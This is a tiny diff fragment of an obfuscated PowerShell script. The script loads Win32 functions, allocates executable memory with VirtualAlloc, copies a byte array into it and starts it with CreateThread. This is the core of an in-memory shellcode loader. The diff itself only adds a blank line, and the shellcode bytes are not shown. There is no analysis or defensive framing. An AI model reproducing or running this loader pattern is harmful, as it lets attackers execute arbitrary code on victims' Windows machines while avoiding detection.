@@ -13,4 +13,5 @@ $jRtcAtjO = Add-Type -memberDefinition $oYFdZQEknWYW -Name "Win32" -namespace Wi
 $TfitfpyWuVGuOdS = $jRtcAtjO::VirtualAlloc(0,[Math]::Max($rLAZTLki.Length,0x1000),0x3000,0x40)
 
 [System.Runtime.InteropServices.Marshal]::Copy($rLAZTLki,0,$TfitfpyWuVGuOdS,$rLAZTLki.Length)
+
 $jRtcAtjO::CreateThread(0,0,$TfitfpyWuVGuOdS,0,0,0)
